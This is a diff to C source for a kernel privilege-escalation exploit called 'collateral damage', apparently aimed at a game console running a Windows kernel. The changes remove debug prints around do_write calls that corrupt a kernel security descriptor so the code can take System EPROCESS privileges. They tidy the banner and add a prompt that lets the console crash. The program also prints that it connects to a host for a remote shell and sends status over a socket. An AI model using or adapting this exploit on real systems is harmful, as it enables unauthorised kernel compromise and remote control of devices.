@@ -243,13 +243,11 @@ int do_exploit()
     getobjptr(&ullSystemEPROCaddr, 4, 4);
 
     // corrupt the security descriptor
-
-	printf("we got far B\n");
 	
-    do_write(nt_base + sd_ptr_offset - 0x18); printf("we got far A\n");
-    do_write(nt_base + sd_ptr_offset - 0x18 - 1); printf("we got far A\n");
-    do_write(nt_base + sd_ptr_offset - 0x18 - 2); printf("we got far A\n");
-    do_write(nt_base + sd_ptr_offset - 0x18 - 3); printf("we got far A\n");
+    do_write(nt_base + sd_ptr_offset - 0x18);
+    do_write(nt_base + sd_ptr_offset - 0x18 - 1); 
+    do_write(nt_base + sd_ptr_offset - 0x18 - 2); 
+    do_write(nt_base + sd_ptr_offset - 0x18 - 3); 
 
     ullSystemEPROCaddr = 0;
     getobjptr(&ullSystemEPROCaddr, 4, 4);
@@ -423,7 +421,7 @@ int main(int argc, char** argv)
 
     printf("===============================\n");
     printf(" collateral damage\n");
-	           printf("devMode edition\n");
+    printf("              devMode edition\n");
     printf("===============================\n");
 
     printf("--> connecting to host for logging and remote shell, even though this dose ssh thingy!\n");
@@ -521,6 +519,12 @@ int main(int argc, char** argv)
 	    printf("ioring setup failed!\n");
         sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
         send(winSock, ptr_msg, strlen(ptr_msg), 0);
+	    printf("would you like to crash the console, to reboot faster. Y/N\n");
+	    if (getchar() == 'Y' || getchar() == 'y') {
+		    printf("continuing, so console crashes....\n");
+	    } else {
+	    	exit(0);
+	    }
     }
 
 printf("corrupting....\n");
